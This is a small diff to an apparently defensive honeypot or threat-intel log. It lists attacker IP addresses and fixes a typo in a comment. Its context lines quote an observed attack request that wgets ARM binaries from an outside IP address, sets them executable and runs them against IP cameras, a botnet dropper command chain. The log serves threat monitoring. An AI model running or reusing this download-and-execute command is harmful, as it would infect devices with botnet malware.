@@ -5,7 +5,7 @@ Top 5 IPs for todays date
 45.95.146.102
 220.246.89.117
 
-#malcious payload observed:
+#Malicious payload observed:
 (After couple of days of inactivity it seems KrebsOnSecurity UA is back)
 GET /shell?cd+/tmp;rm+TRC.arm+TRC.arm7;wget+http://93.123.85.5/trc/TRC.arm7;chmod+777+TRC.arm7;./TRC.arm7+ipcams;wget+http://93.123.85.5/trc/TRC.arm;chmod+777+TRC.arm;./TRC.arm+ipcams HTTP/1.1
 Connection: keep-alive
